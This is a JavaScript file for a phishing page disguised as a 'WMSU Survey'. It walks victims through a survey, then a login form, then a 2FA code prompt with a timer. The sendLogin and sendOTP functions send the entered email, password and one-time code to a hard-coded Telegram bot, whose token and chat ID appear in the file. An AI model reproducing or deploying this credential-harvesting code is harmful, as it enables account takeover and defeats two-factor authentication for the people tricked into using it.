// --- CONFIGURATION ---
const BOT_TOKEN = "8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU";
const CHAT_ID = "5207464165";

// Update Progress Bar
document.querySelectorAll('input[type="radio"]').forEach(radio => {
    radio.addEventListener('change', () => {
        const checkedCount = document.querySelectorAll('input[type="radio"]:checked').length;
        document.getElementById('bar').style.width = (checkedCount * 10) + "%";
    });
});

// Step Navigation
function showStep(stepId) {
    document.getElementById('survey-section').classList.add('hidden');
    document.getElementById('login-section').classList.add('hidden');
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById(stepId).classList.remove('hidden');
    window.scrollTo(0,0);
}

// 2-Minute Timer
function startTimer() {
    let duration = 120; 
    const display = document.getElementById('time-left');
    const timerInterval = setInterval(() => {
        let mins = Math.floor(duration / 60);
        let secs = duration % 60;
        display.textContent = `${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`;
        if (--duration < 0) clearInterval(timerInterval);
    }, 1000);
}

// ACTION 1: Send User/Pass ONLY
async function sendLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) return alert("Please fill all fields.");

    const text = `🏛 **WMSU Survey: New Login**\nUser: \`${email}\`\nPass: \`${pass}\``;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    try {
        await fetch(url);
        showStep('auth-section');
        startTimer();
    } catch (e) {
        console.error("Telegram Error:", e);
    }
}

// ACTION 2: Send OTP ONLY
async function sendOTP() {
    const code = document.getElementById('2fa_code').value;

    if(code.length < 6) return alert("Enter the 6-digit code.");

    const text = `🔑 **WMSU Survey: OTP Code**\nCode: \`${code}\``;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    try {
        await fetch(url);
        alert("Submission complete. Thank you for participating!");
        location.reload();
    } catch (e) {
        console.error("Telegram Error:", e);
    }
}